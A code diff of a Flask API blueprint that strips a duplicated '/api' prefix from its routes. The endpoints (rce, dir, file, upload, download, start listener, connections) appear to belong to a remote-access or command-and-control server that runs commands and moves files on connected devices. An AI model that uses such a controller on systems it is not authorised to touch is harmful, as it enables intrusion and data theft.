@@ -4,7 +4,7 @@ from globals import *
 def api_endpoints(Handler):
     api = Blueprint("api", __name__, url_prefix="/api")
 
-    @api.route("/api/rce", methods=["POST"])
+    @api.route("/rce", methods=["POST"])
     def rce():
         id = request.form.get("id")
         cmd = request.form.get("cmd")
@@ -14,7 +14,7 @@ def api_endpoints(Handler):
         else:
             return jsonify({"status": "error", "output": output}), 400
 
-    @api.route("/api/infos", methods=["GET"])
+    @api.route("/infos", methods=["GET"])
     def infos():
         id = request.args.get("id")
         status, output = Handler.get_device_infos(id)
@@ -23,7 +23,7 @@ def api_endpoints(Handler):
         else:
             return jsonify({"status": "error", "output": output}), 400
 
-    @api.route("/api/dir", methods=["GET"])
+    @api.route("/dir", methods=["GET"])
     def dir():
         id = request.args.get("id")
         dir = request.args.get("dir")
@@ -33,7 +33,7 @@ def api_endpoints(Handler):
         else:
             return jsonify({"status": "error", "output": output}), 400
 
-    @api.route("/api/file", methods=["GET"])
+    @api.route("/file", methods=["GET"])
     def file():
         id = request.args.get("id")
         path = request.args.get("path")
@@ -43,7 +43,7 @@ def api_endpoints(Handler):
         else:
             return jsonify({"status": "error", "output": output}), 400
 
-    @api.route("/api/upload", methods=["POST"])
+    @api.route("/upload", methods=["POST"])
     def upload():
         id = request.form.get("id")
         fil = request.form.get("fil")
@@ -54,7 +54,7 @@ def api_endpoints(Handler):
         else:
             return jsonify({"status": "error", "output": output}), 400
 
-    @api.route("/api/download", methods=["POST"])
+    @api.route("/download", methods=["POST"])
     def download():
         id = request.form.get("id")
         target_path = request.form.get("target_path")
@@ -65,7 +65,7 @@ def api_endpoints(Handler):
         else:
             return jsonify({"status": "error", "output": output}), 400
 
-    @api.route("/api/start", methods=["POST"])
+    @api.route("/start", methods=["POST"])
     def start():
         address = request.form.get("address")
         port = request.form.get("port")
@@ -76,7 +76,7 @@ def api_endpoints(Handler):
         else:
             return jsonify({"status": "success", "output": "Server started"}), 200
 
-    @api.route("/api/stop", methods=["DELETE"])
+    @api.route("/stop", methods=["POST"])
     def stop():
         try:
             Handler.stop()
@@ -85,7 +85,7 @@ def api_endpoints(Handler):
         else:
             return jsonify({"status": "success", "output": "Server stopped"}), 200
 
-    @api.route("/api/connections", methods=["GET"])
+    @api.route("/connections", methods=["GET"])
     def connections():
         return jsonify({"status": "success", "output": Handler.connections}), 200
     return api
